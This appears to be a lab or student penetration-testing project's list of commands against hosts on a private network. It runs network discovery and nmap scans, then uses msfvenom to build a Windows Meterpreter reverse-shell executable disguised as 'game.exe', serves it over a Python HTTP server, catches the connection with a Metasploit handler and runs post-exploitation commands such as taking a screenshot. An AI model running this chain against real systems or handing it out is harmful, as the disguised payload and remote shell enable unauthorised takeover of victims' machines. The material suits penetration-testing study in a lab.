Commands used in the project:

1) Network discovery / target identification
netdiscover -r 192.168.56.0/24


– Passive/ARP network discovery to find hosts on the 192.168.56.0/24 network.

2) Scanning & enumeration (Nmap)

          nmap  –sV  192.168.1.6

– Service/version detection on the target IP.

        nmap -sV -sC 192.168.1.6

Aggresive scan for detailed scanning.
 
          nmap -A 192.168.1.6
  
– Service/version detection plus default scripts (-sC) for basic enumeration.


3) Payload generation (msfvenom)
   
         msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f exe > /tmp/game.exe

– Build a Windows Meterpreter reverse TCP executable named game.exe and write it to /tmp/game.exe.

4) Hosting the payload (simple HTTP server)
   
         python3 -m http.server 80


– Host the payload on attacker machine on port 80 so the target can download it (accessed as http://192.168.1.5/game.exe).

5) Metasploit: handler setup & run

Inside msfconsole: Metasploit framework

     use exploit/multi/handler

    set payload windows/meterpreter/reverse_tcp

     set LHOST 192.168.1.5

     set LPORT 4444

      exploit


– Configure and start a listener (multi/handler) for the reverse Meterpreter connection.

6) Meterpreter post-exploitation commands

Run inside an active Meterpreter session:

     meterpreter > sysinfo
     
     meterpreter > getuid

    meterpreter > screenshot


– sysinfo: gather system details.
– getuid: show the user context Meterpreter is running as.
– screenshot: capture the desktop as proof of compromise.
